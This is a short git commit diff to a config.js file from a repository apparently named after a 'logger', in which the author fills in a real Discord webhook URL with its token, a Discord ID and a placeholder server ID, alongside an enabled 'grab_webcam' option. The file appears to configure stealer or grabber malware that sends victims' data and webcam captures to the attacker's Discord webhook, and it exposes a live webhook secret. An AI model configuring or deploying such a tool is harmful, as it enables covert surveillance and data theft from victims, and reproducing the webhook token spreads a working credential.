ebe3a2b7441ecea0bb5f4b3d97624df62c07bafe
TikityLogger0 <112282190+TikityLogger0@users.noreply.github.com>
2022-08-27 17:12:26 -0400

    Hage
    Idk

--- config.js
+++ config.js
@@ -1,7 +1,7 @@
 {
-    "webhook": "WEBHOOK HERE",
-    "discord_id": "ENTER YOUR DISCORD ID",
-    "server_id": "ENTER YOUR SERVER ID",
+    "webhook": "https://discord.com/api/webhooks/1013193318596886608/b4I0BsUKTb41kk5nhSyMpVJSwyCWVviLbiBL2ZYUvdwGY6XPiBVa5wkbrpqYY3RROxN_",
+    "discord_id": "#2777",
+    "server_id": "??",
     
  
     "grab_webcam": true, 
